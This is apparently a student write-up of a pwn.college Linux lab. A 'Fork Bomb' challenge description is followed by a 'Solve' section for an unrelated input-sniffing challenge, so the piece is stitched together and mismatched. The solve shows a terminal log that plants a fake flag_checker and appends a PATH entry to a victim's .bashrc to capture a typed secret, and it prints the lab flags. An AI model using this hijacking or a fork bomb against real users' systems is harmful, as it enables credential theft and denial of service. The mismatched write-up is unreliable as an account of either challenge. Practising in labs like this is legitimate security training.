# Linux Luminarium
# Module 15: Daring Destruction

## The Fork Bomb
As you learned in the Processes and Jobs module, whenever you start a program the Linux operating system creates a new process. If you create processes faster than the kernel can handle, the process table fills up and everything grinds to a halt. This new process (e.g., of an ls invocation) is "forked" off of a parent process (e.g., a shell instance). Thus, the induced explosion of processes is called a "Fork Bomb".

You have the tools to do this:

write a small script (like in the Chaining Commands module)
make it executable (like in the Perceiving Permissions module)
make it launch a copy of itself in the background (like in the Processes and Jobs module)
and then launch another copy of itself in the background!
Each copy will launch two more, and each of those will launch two more, and you will flood the system with so many processes that new ones will not be able to start!

This challenge contains a /challenge/check that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so. Make sure to launch it (in a different terminal) before launching your attack; otherwise you won't be able to launch it!

NOTE: Needless to say, this will render your environment unusable. Just restart the challenge (or start a different one) to get things back to a usable state!

### Solve
**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`

This challenge combined two concepts from earlier modules: modifying a user's .bashrc file and hijacking commands through PATH. Instead of stealing a file, the goal was to intercept a secret that Zardus manually entered into the flag_checker program. A fake flag_checker script was created that displayed the expected prompt (Type the flag) and then echoed whatever input it received. The victim's .bashrc was modified to place the directory containing the fake program at the front of PATH. When Zardus logged in and executed flag_checker, the shell found and launched the malicious version instead of the real one, causing the flag to be printed back to the screen.

```bash
hacker@shenanigans~sniffing-input:~$ mkdir ~/evil
hacker@shenanigans~sniffing-input:~$ nano ~/evil/flag_checker
(#!?bin/bash
echo "Type the flag"
cat)
hacker@shenanigans~sniffing-input:~$ chmod +x ~/evil/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker/evil:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
zardus@shenanigans~sniffing-input:~$ ***********
-bash: 1498726685: command not found
zardus@shenanigans~sniffing-input:~$ flag_checker

Type the flag
*************************************************************pwn.college{4KJrUijph2pPaiqOSQNdt0S-otI.0VNzEzNxwiNyUDN0EzW}
```

### New Learnings
Learned how command hijacking can be used to intercept sensitive user input rather than simply execute malicious commands. Reinforced the importance of the PATH variable in determining which executable is launched when a command name is entered. Also gained experience combining startup-script persistence (.bashrc) with PATH manipulation to replace a legitimate program with a malicious lookalike, demonstrating a classic technique used by attackers to capture credentials, secrets, and other user-provided data.